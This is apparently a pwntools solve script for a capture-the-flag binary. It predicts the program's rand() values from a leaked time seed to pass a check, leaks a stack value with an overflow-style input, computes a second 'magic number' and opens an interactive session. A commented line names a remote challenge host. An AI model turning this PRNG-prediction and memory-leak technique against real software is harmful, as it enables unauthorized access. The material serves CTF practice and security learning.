from pwn import *
import ctypes
import warnings
import time

elf = context.binary = ELF("./challenge_patched")
context.binary = elf
r = elf.process()

# def GDB():
#     gdb.attach(r, '''
#         b* main + 43\n
#         b* Advanced_Magic+291 \n
#         b* Advanced_Magic+351 \n
#         b* Advanced_Magic+398 \n
#         c
#     ''')

### Stage 1 ###
# GDB()
#r = remote("34.126.117.161", 2000)
r = elf.process()
r.recvline()
seed = int(r.recvline(),10)
log.success(f"SEED: {seed}")
#sleep(1)
libc = ctypes.CDLL("libc.so.6")
libc.srand(seed)
ran_num = libc.rand()
time_ran = seed
log.success("Random number: " + hex(ran_num))
log.success("Time random:" + hex(time_ran))
random_number = (ran_num ^ time_ran ^ 0xDEADBEEFDEADC0DE) - 0xffffffffffffffff
log.success("Random after calc: " + hex(random_number))
###### Bypass SRAND ######
r.send(b"\n")
r.sendline(str(random_number))
# ## Stage 2 ###
r.send(b"\n")
payload = b"1" * 30 + b"||"
r.send(payload)
r.recvuntil(b"|")
v5 = u64(r.recv(8))
log.success(f"V5: {hex(v5)}")
r.recvuntil(b"\x1B[1A\x1B[K")
libc.srand(seed + 4)
v6 = libc.rand()
log.success(f"V6: {hex(v6)}")
magic_num = (v6 ^ v5 ^ 0xDEADBEEFDEADC0DE) - 0xffffffffffffffff
log.success("Magic number: " + hex(magic_num))
r.sendline(str(magic_num))
r.interactive()